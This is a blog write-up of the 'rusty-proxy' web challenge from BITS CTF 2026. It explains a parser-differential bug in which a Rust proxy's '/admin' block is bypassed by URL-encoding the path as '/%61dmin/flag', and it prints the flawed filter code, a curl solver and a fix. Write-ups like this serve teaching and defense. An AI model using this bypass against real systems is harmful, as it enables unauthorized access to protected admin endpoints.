---
title: "[Web] rusty-proxy"
description: Writeup for "rusty-proxy" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# rusty-proxy (BITS CTF 2026)

---

- **Name:** rusty-proxy
- **Category:** Web
- **Description:** I just vibecoded a highly secure reverse proxy using rust, I hope it works properly.
- **Difficulty:** ★☆☆☆☆

---

## TL;DR

The Rust proxy blocks `/admin` paths using a plain string check — no URL decoding.
Sending `/%61dmin/flag` passes the proxy (`` %61 `` ≠ `a` to the proxy), but Flask on the backend decodes `%61` → `a` and routes it to `/admin/flag`.

```bash
curl "http://<TARGET>/%61dmin/flag"
```

---

## Overview

```
[Client]
    │
    ▼
[Rust Proxy :80]
  blocks /admin paths
    │
    ▼
[Flask Backend :8080]
  /admin/flag → returns FLAG
```

- `proxy/src/main.rs` — Rust reverse proxy with path filter
- `backend/server.py` — Flask backend that holds the flag

---

## Solution

### 1) Recon

The Flask backend exposes the flag at `/admin/flag`:

```python
FLAG = os.getenv("FLAG", "BITSCTF{fake_flag}")

@app.route('/admin/flag')
def vault():
    return jsonify({"flag": FLAG})
```

Direct access is blocked by the proxy sitting in front of it.

---

### 2) Root Cause

The proxy's path filter in `main.rs`:

```rust
fn is_path_allowed(path: &str) -> bool {
    let normalized = path.to_lowercase();
    if normalized.starts_with("/admin") {
        return false;
    }
    true
}
```

It compares the raw URL string **without decoding** it first.

| Request path | Proxy sees | Starts with `/admin`? | Result |
|---|---|---|---|
| `/admin/flag` | `/admin/flag` | ✅ YES | **Blocked** |
| `/%61dmin/flag` | `/%61dmin/flag` | ❌ NO | **Passes** ✅ |

`%61` is the URL-encoded form of `a`.
The proxy doesn't decode it, so the check is bypassed.
Flask/Werkzeug decodes `%61` → `a` as per HTTP standard and routes to `/admin/flag`.

---

### 3) Exploit Strategy

URL-encode the `a` in `admin` to bypass the proxy's string check.

```
Normal:   /admin/flag
Encoded:  /%61dmin/flag
           ^^^
           'a' encoded as %61
```

Attack flow:

```
1. Client sends /%61dmin/flag
        ↓
2. Rust proxy: starts_with("/admin")? → NO → passes
        ↓
3. Flask decodes %61 → a → routes to /admin/flag
        ↓
4. FLAG returned
```

---

### 4) Why It Works

The proxy and backend interpret the URL differently:

**Rust proxy** — treats the URL as a raw string, no decoding:
```rust
// %61dmin ≠ admin → check passes
normalized.starts_with("/admin")
```

**Flask/Werkzeug** — decodes percent-encoded characters per HTTP spec:
```python
# %61 → a → /admin/flag is matched
@app.route('/admin/flag')
```

This is a classic **Parser Differential** bug — when a security filter and the actual handler parse input differently, the filter can always be bypassed.

> **Fix:** Always decode URLs before applying security checks, using the same logic as the backend.

---

## Solver

```bash
curl "http://<TARGET>/%61dmin/flag"
```

Response:
```json
{"flag": "BITSCTF{...}"}
```
